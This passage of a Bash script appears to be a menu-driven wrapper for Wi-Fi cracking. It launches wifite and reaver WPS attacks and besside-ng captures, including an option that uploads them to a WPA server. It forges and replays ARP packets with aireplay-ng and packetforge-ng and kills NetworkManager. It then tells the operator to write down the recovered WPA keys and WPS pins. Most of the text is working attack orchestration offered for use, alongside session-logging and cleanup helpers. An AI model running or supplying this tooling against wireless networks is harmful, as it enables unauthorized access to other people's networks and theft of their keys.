	echo "*************************************"
	$white
	echo ""
	echo ""
	echo ""
	echo ""
	$yellow
	echo "If the key is available, now would be a good time to do the following:"
	echo ""
	echo "1) Write down the WPA/WPA2 key and/or WPS pin"
	echo ""
	echo "2) Take a picture of the screen to keep a record of the keys"
	$white
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue...."
	echo ""
	echo ""

	getBSSIDCharOnly
	reaverSaveCurrentSessionFile

	read pause

}


menuAttacksWPSWifiteAuto(){

	currentTask="menuAttacksWPSWifiteAuto"
	lastMenuID="menuAttacksWPSWifiteAuto"

	killAll

	#$terminal $wifiteAttackWPS -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
	$terminal $wifiteAttackWPS &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	echo ""
	echo ""
	echo "Your wifite session has been saved!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "If the key is available, now would be a good time to do the following:"
	echo ""
	echo "1) Write down the WPA/WPA2 key and/or WPS pin"
	echo ""
	echo "2) Take a picture of the screen to keep a record of the keys"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue...."
	echo ""
	echo ""

	killAll
	menuAuto

	read pause

}


aircrackDecryptWPS(){

	# NOT ACTUALLY USED FOR WPS ATTACK

	currentTask="aircrackDecryptWPS"

	blank=""

}


reaverSaveCurrentSessionFile(){

	currentTask="reaverSaveCurrentSessionFile"

	if [ "$bssidCharOnly" != "" ];then

		cp ../../$reaverSessionPath/$bssidCharOnly.wpc "$capturePathWPS"

	fi

}


reaverSaveAllSessionFiles(){

currentTask="reaverSaveCurrentSessionFile"

	if [ "$bssidCharOnly" != "" ];then

		cp ../../$reaverSessionPath/*.wpc "$capturePathWPS"

	fi

}


menuBullyMain() {

banner
echo ""
echo "Bully WPS Attack Menu"
echo ""
echo ""
echo ""
echo ""
echo "Choose an option and press ENTER:"
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""

}


############################################################################
#   ATTACKS: WPS END   #####################################################
############################################################################




############################################################################
#   ATTACKS: UNIVERSAL BEGIN   #############################################
############################################################################

menuAttacksAllWifiteAuto(){

	currentTask="menuAttacksAllWifiteAuto"
	lastMenuID="menuAttacksAllWifiteAuto"

	killAll

	$terminal $wifiteAttackAll &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	killAll
	menuMain

}


generateArpPacket(){

	currentTask="generateArpPacket"

	$terminal aireplay-ng -4 $interfaceMonitor &
	
	# Alt
	$terminal aireplay-ng -4 -h $macAddressMonitor $interfaceMonitor &

}


tcpDump(){

	# Accepts a CAP file as INPUT
	$terminal tcpdump -s 0 -n -e -r $1 &
	
}


forgeArpRequest(){

	# Accepts an XOR file as INPUT
	#packetforge-ng -0 -a $bssid -h $macAddressMonitor -k 192.168.1.2 -l 192.168.1.100 -y $1 -w "$initPath/$bssid-arp.cap" &

	# Accepts an XOR file as INPUT and a CAP file as OUTPUT
	packetforge-ng -0 -a $bssid -h $macAddressMonitor -k 192.168.1.2 -l 192.168.1.100 -y $1 -w $2 &

}


replayArpRequest(){

	aireplay-ng -2 -r "$initPath/$bssid-arp.cap" $interfaceMonitor &

	# Accepts a CAP file as INPUT
	#aireplay-ng -2 -r $1 $interfaceMonitor &

}



############################################################################
#   ATTACKS: UNIVERSAL END   ###############################################
############################################################################




############################################################################
#   BESSIDE-NG STUFF BEGIN   ###############################################
############################################################################


bessideMain(){

	currentTask="bessideMain"

	banner
	bannerStats

	echo ""
	echo "Select a mode and press ENTER:"
	echo ""
	echo ""
	echo "1) Normal"
	echo ""
	echo "2) WPA Only"
	echo ""
	echo "3) Upload"
	echo ""
	echo "4) Set Flood Rate"
	echo ""
	echo "5) Return To Previous Menu"
	echo ""
	echo ""

	read getBessideMode

	case "$getBessideMode" in

		"")
		bessideMain
		;;

		"1")
		bessideNormal
		;;

		"2")
		bessideWPAOnly
		;;

		"3")
		bessideUpload
		;;

		"4")
		bessideSetFloodRate
		;;

		"5")
		$lastMenuID
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"S" | "s")
		menuSessionSave
		;;

		"A" | "a")
		menuAdvanced
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		bessideMain
		;;

	esac

}


bessideNormal(){

	currentTask="bessideNormal"

	$terminal besside-ng -b $bssid -c $channel -vv $interfaceMonitor

}


bessideUpload(){

	currentTask="bessideUpload"

	$terminal besside-ng -b $bssid -c $channel -s $serverWPA -vv $interfaceMonitor

}


bessideWPAOnly(){

	currentTask="bessideWPAOnly"

	$terminal besside-ng -b $bssid -c $channel -W -vv $interfaceMonitor

}


bessideSetFloodRate(){

	currentTask="bessideSetFloodRate"

	bessideFloodRate=""

}


############################################################################
#   BESSIDE-NG STUFF END   #################################################
############################################################################




############################################################################
#   POST EXPLOITATION BEGIN   ##############################################
############################################################################






############################################################################
#   POST EXPLOITATION END   ################################################
############################################################################




############################################################################
#   PROCESS MANAGEMENT BEGIN   #############################################
############################################################################


killProcesses(){

	currentTask="killProcesses"

	killall NetworkManager
	killall NetworkManagerDispatcher
	#killall wpa_supplicant
	#killall avahi-daemon

}


restartProcesses(){

	currentTask="restartProcesses"

	#killall NetworkManager
	NetworkManager

	#killall NetworkManagerDispatcher
	NetworkManagerDispatcher

	#wpa_supplicant
	#avahi-daemon

}


killWifite(){

	currentTask="killWifite"

	findWifitePID=$(ps -A | grep "wifite" | head -c5)

	case "$findWifitePID" in

		"")
		# No Process Found
		;;

		*)
		killWifiteTemp=$(kill $findWifitePID)
		;;
	esac
	

}


killAirodump(){

	currentTask="killAirodump"

	findAirodumpPID=$(ps -A | grep "airodump-ng" | head -c5)

	case "$findAirodumpPID" in

		"")
		# No Process Found
		;;

		*)
		killAirodumpTemp=$(kill $findAirodumpPID)
		#killAirodumpTemp=$(killall airodump-ng)
		;;
	esac

}


killAireplay(){

	currentTask="killAireplay"

	findAireplayPID=$(ps -A | grep "aireplay-ng" | head -c5)

	case "$findAireplayPID" in

		"")
		# No Process Found
		;;

		*)
		killAireplayTemp=$(kill $findAireplayPID)
		;;
	esac

}


killAircrack(){

	currentTask="killAircrack"

	findAircrackPID=$(ps -A | grep "aircrack-ng" | head -c5)

	case "$findAircrackPID" in

		"")
		# No Process Found
		;;

		*)
		killAircrackTemp=$(kill $findAircrackPID)
		;;
	esac

}


killAll(){

	killAirodump
	killAireplay
	killAircrack
	killWifite

}


############################################################################
#   PROCESS MANAGEMENT END   ###############################################
############################################################################





############################################################################
#   SESSION LOG STUFF BEGIN   ##############################################
############################################################################


cleanSessionFiles(){

	currentTask="cleanSessionFiles"

	banner
	echo ""
	$red
	echo "*** THIS WILL ERASE ALL CURRENT SESSION FILES!!!"
	$white
	echo ""
	echo ""
	echo "If you would like to create a backup before doing this, press B and ENTER"
	echo ""
	echo ""
	echo "If you would like to CANCEL, press C and ENTER"
	echo ""
	echo ""
	echo ""
	echo ""
	$cyan
	echo "Automatically Continuing In 10 Seconds"
	$white
	echo ""
	echo ""

	read -t 10 eraseSessionConfirm

	case "$eraseSessionConfirm" in

		"")
		banner
		echo ""
		echo "Cleaning Session Files...."
		echo ""
		echo ""

		#rm "$capturePath/wep/wep.sessions"
		#rm "$capturePath/wps/wps.sessions"
		#rm "$capturePath/wpa/wpa.sessions"
		#rm "$capturePath/wpa2/wpa2.sessions"

		rm -r "$capturePath"
		sleep 1
		mkdir "$capturePath"

		banner
		echo ""
		echo "Cleaning Session Files...."
		echo ""
		echo ""
		;;

		"c" | "C")
		menuExtras
		;;

		"b" | "B")
		backupFromSessionErase="1"
		backupSessionFiles
		;;

		*)
		cleanSessionFiles
		;;

	esac

}


backupSessionFiles(){

	currentTask="backupSessionFiles"

	backupName="sessions-backup-$displayDate3"
	backupDir="sessions"
	#nextBackupSlot=0

	if [ -f "$backupName.zip" ]; then 
		nextBackupSlot=$((nextBackupSlot+1))
		backupName="$backupName-$nextBackupSlot"
	fi
		

	#echo "$backupName"
	#echo "$nextBackupSlot"
	#read pause

	banner
	echo ""
	echo "Backing Up Session Files To:"
	echo ""
	$cyan
	echo "$backupName...."
	$white
	echo ""
	echo ""

	case "$backupFromCaptureErase" in

		"1")
		sessionCopyNewCaptureFiles
		banner
		echo ""
		sleep 2
		zip -9 -r $backupName $backupDir
		sleep 1
		cleanCaptureFiles
		backupFromCaptureErase="0"
		;;
	esac

	case "$backupFromSessionErase" in

		"0")
		sleep 3
		zip -9 -r $backupName $backupDir
		;;

		"1")
		sleep 2
		zip -9 -r $backupName $backupDir
		sleep 1
		cleanSessionFiles
		backupFromSessionErase="0"
		;;
	esac

}


sessionWriteBeginNew(){

	currentTask="sessionWriteBeginNew"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** Begin New Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


sessionWriteLoadPrevious(){

	currentTask="sessionWriteLoadPrevious"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** Load Previous Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


sessionWriteEndCurrent(){

	currentTask="sessionWriteEndCurrent"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** End Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


sessionRemoveEmpty(){

	currentTask="sessionRemoveEmpty"

	#banner
	#echo ""
	#echo "Removing Empty Sessions...."
	#echo ""
	#echo ""

	rm "$capturePath/$encryptionType/empty.sessions"
	rmdir "$capturePath/empty"

	banner
	echo ""
	#echo "Removing Empty Sessions...."
	#echo ""
	#echo ""

}


sessionCreatePaths(){

	getBSSIDCharOnly

	mkdir "$capturePath"
	mkdir "$capturePath/$encryptionType/"

}


sessionCopyNewCaptureFiles(){

	cp *.cap "$capturePath/$encryptionType"
	cp *.ivs "$capturePath/$encryptionType"
	cp *.xor "$capturePath/$encryptionType"
	cp *.csv "$capturePath/$encryptionType"
	cp *.netxml "$capturePath/$encryptionType"

}


sessionSave(){

	currentTask="sessionSave"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** Save Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


sessionLoad(){

	banner
	bannerStats

	currentTask="sessionLoad"

	while read line           
	do           
		echo -e "$line \n"           
	done <"$capturePath/$encryptionType/$encryptionType.sessions"

	echo ""
	echo ""
	echo ""
	echo "Scroll up to see all loaded sessions."
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue...."
	echo ""
	echo ""

	read pause

}


############################################################################
#   SESSION LOG STUFF END   ################################################
############################################################################





############################################################################
#   EMPTY VARIABLE CHECKS BEGIN   ##########################################
############################################################################


checkForEmptyEncryptionType(){

	currentTask="checkForEmptyEncryptionType"

	if [ "$encryptionType" == "empty" ];then

		banner
		bannerStats

		echo ""
		echo "There is currently no Encryption Type selected!"
		echo ""
		echo ""
		echo "Press ENTER to return to main menu...."
		echo ""
		echo ""

		read pause

		menuMain
	fi

}


checkForEmptyCredentials(){

	currentTask="checkForEmptyCredentials"

	case "$1" in

		"bssid")
		if [ "$bssid" == "" ];then

			banner
			bannerStats

			echo ""
			echo "There is currently no BSSID saved in the previous session!"
			echo ""
			echo ""
			echo "Press ENTER to return to previous menu...."
			echo ""
			echo ""

			read pause

			$lastMenuID
		fi
		;;

		"essid")
		if [ "$essid" == "" ];then

			banner
			bannerStats

			echo ""
			echo "There is currently no ESSID saved in the previous session!"
			echo ""
			echo ""
			echo "Press ENTER to return to previous menu...."
			echo ""
			echo ""

			read pause

		fi

		;;

		"channel")
		if [ "$channel" == "" ];then

			banner
			bannerStats

			echo ""
			echo "There is currently no CHANNEL saved in the previous session!"
			echo ""
			echo ""
			echo "Press ENTER to return to previous menu...."
			echo ""
			echo ""

			read pause

			$lastMenuID
		fi
		;;

	esac

}


############################################################################
#   EMPTY VARIABLE CHECKS END   ############################################
############################################################################





############################################################################
#   MISC STUFF BEGIN   #####################################################
############################################################################


getWirelessInterfaces(){

	currentTask="getWirelessInterfaces"

	# Check for the "refresh" flag and DO NOT display text if enabled
	# This is for the 2nd "getWirelessInterfaces" call for some forgotten reason :rolleyes: (Hides Text)
	case "$1" in

		# This is just splashing some text to wait out the 5 minute timeout....make it look useful!!
		"refresh")
		banner
		echo ""
		echo "Preparing $encryptionTypeText Attack...."
		echo ""
		;;

		*)
		banner
		echo ""
		echo "Auto-Setting Wireless Interface Modes"
		echo ""
		echo ""
		echo ""
		$cyan
		echo "To Change Adapter Settings, Press \"M\" Now"
		$white
		#echo ""
		#$cyan
		#echo "Current: $interface"
		$white
		#echo ""
		#echo ""
		#echo "To Spoof MAC Address, Press \"W\" Now"
		#echo ""
		#$cyan
		#echo "Current: $macAddress"
		#$white
		echo ""
		echo ""
		echo ""
		echo "TO USE DEFAULTS, JUST PRESS ENTER!"
		echo ""
		echo ""
		echo "Continuing In 10 Seconds...."
		echo ""
		echo ""
		;;

	esac

	read -t 10 manualInterface

	case "$manualInterface" in

		"")
		case "$isKaliTwo" in

			"0")
			interface=$(iwconfig | grep "wlan" | head -c 5)
			#interfaceMonitor=$(iwconfig | grep "mon" | head -c 4)
			interfaceMonitor="$interface""mon"
			interfaceName=$interfaceMonitor
			;;

			"1")
			interface=$(iwconfig | grep "wlan" | head -c 5)
			#interfaceMonitor=$(iwconfig | grep "wlan" | head -c 8)
			interfaceMonitor="$interface""mon"
			interfaceName=$interfaceMonitor
			#fixKaliTwoMonError
			;;

		esac
		;;

		"M" | "m")
		banner
		echo ""
		echo "Enter Managed Mode Interface Name and press ENTER:"
		echo ""
		echo ""
		echo ""
		echo "Example: wlan0"
		echo ""
		echo ""
		echo ""
		$cyan
		echo "If Nothing Is Entered, Then Default Values Are Used"
		$white
		echo ""
		echo ""

		read manualSelectionManaged

		case "$manualSelectionManaged" in

			"")
			interface=$(iwconfig | grep "wlan" | head -c 5)
			;;

			*)
			interface="$manualSelectionManaged"
			;;

		esac

		banner
		echo ""
		echo "Enter Monitor Mode Interface Name and press ENTER:"
		echo ""
		echo ""
		echo ""
		echo "Example: $manualSelectionManaged""mon"
		echo ""
		echo ""
		echo ""
		$cyan
		echo "If Nothing Is Entered, Then Default Values Are Used"
		$white
		echo ""
		echo ""

		read manualSelectionMonitor

		case "$manualSelectionMonitor" in

			"")
			interfaceMonitor="$interface""mon"
			;;

			*)
			interfaceMonitor="$manualSelectionMonitor""mon"
			;;

		esac
		;;

		"W" | "w")
		#returnTo="getWirelessInterfaces"
		#spoofMacAddress
		getWirelessInterfaces
		;;

		*)
		getWirelessInterfaces
		;;

	esac

	#echo "$interface"
	#echo "$interfaceMonitor"
	#read pause

}


cleanCaptureFiles(){

	currentTask="cleanCaptureFiles"

	banner
	echo ""
	$red
	echo "*** THIS WILL ERASE ALL CURRENT CAPTURE FILES!!!"
	$white
	echo ""
	echo ""
	echo "If you would like to create a backup before doing this, press B and ENTER"
	echo ""
	echo ""
	echo "If you would like to CANCEL, press C and ENTER"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Files will be copied to the \"/sessions/\" directory and backed up to a ZIP file"
	echo ""
	echo ""
	echo ""
	echo ""
	$cyan
	echo "Automatically Continuing In 10 Seconds..."
	$white
	echo ""
	echo ""

	read -t 10 eraseCaptureConfirm

	case "$eraseCaptureConfirm" in

		"")
		banner
		echo ""
		echo "Cleaning Capture Files...."
		echo ""
		echo ""

		sleep 3

		rm *.cap
		rm *.ivs
		rm *.xor
		rm *.csv
		rm *.netxml
		;;

		"c" | "C")
		menuExtras
		;;

		"b" | "B")
		backupFromCaptureErase="1"
		backupSessionFiles
		;;

		*)
		cleanCaptureFiles
		;;

	esac

}


findCaptureFiles(){

	currentTask="findCaptureFiles"

	listCap=$(ls | grep .cap)
	listIvs=$(ls | grep .ivs)
	listXor=$(ls | grep .xor)
	listCsv=$(ls | grep .csv)
	listNetXml=$(ls | grep .netxml)

}


getCustomList(){

	banner
	bannerStats

	currentTask="getCustomList"

	echo ""
	echo "Enter the path to the list and press ENTER:"
	echo ""
	echo ""
	echo "Example: /pentest/wordlists/dictionary1.txt"
	echo ""
	echo ""


	read tmpCustomList

	case "$tmpCustomList" in

		"")
		getCustomList
		;;

		*)
		wordlist="$tmpCustomList"
		;;

	esac

}


getBSSIDCharOnly(){

	currentTask="getBSSIDCharOnly"

	if [ "$bssid" != "" ];then

		bssidCharOnly=$(echo $bssid | sed 's/[\:]//g')
	fi

}


getCurrentDate(){

	displayDate=$(date +"%D")
	displayDate2=$(date +"%Y-%m-%d")
	displayDate3=$(date +"%Y%m%d")

}


getCurrentTime(){

	displayTime=$(date +"%T")

}


getCurrentDateAndTime(){

	displayDateAndTime=$(date +"%D - %T")
	displayDateAndTime2=$(date +"%Y%m%d / %T")
	displayDateAndTime3=$(date +"%Y-%m-%d / %T")

}


fixNegativeOneChannelError(){

	airmon-ng check kill

}

startNetworkManager(){

	NetworkManager

}

killNetworkManager(){

	currentPID=$(ps -A | grep NetworkManager | cut -c 1-5)
	killTask=$(kill $currentPID)

	#echo "$currentPID"
	#echo "$killTask"

	#read pause

}

killWpaSupplicant(){

	#currentPID=$(ps -A | grep wpa_supplicant | cut -c 1-5)
	#killTask=$(kill $currentPID)

	killall wpa_supplicant

	#echo "$currentPID"
	#echo "$killTask"

	#read pause

}

disableChannelHopping(){

	sleep 1
	ifconfig $interface down

}

enableChannelHopping(){

	sleep 1
	ifconfig $interface up

}

interfaceUp(){

	#ifconfig $interface up
	ifconfig $interfaceMonitor up

}

interfaceDown(){

	#ifconfig $interface down
	ifconfig $interfaceMonitor down

}

interfaceManaged(){

	#iwconfig wlan0mon mode managed
	iwconfig $interfaceMonitor mode managed

}

interfaceMonitor(){

	#iwconfig wlan0mon mode monitor
	iwconfig $interfaceMonitor mode monitor

}

fixKaliTwoMonError(){

	case "$isDebugMode" in
	
		"1")
		echo "DEBUG: Kali 2.x Fix - Step 1"
		echo ""
		echo "$interface"
		echo "$interfaceMonitor"
		read pause
		;;
	esac

	ifconfig $interfaceMonitor down
	sleep 2
	iwconfig $interfaceMonitor mode monitor
	sleep 2
	ifconfig $interfaceMonitor up

	case "$isDebugMode" in
	
		"1")
		echo "DEBUG: Kali 2.x Fix - Step 2"
		echo ""
		echo "$interface"
		echo "$interfaceMonitor"
		read pause
		;;
	esac
}


############################################################################
#   MISC STUFF END   #######################################################
############################################################################





############################################################################
#   INITIAL LAUNCH BEGIN   #################################################
############################################################################


initMain

############################################################################
#   INITIAL LAUNCH END   ###################################################
############################################################################







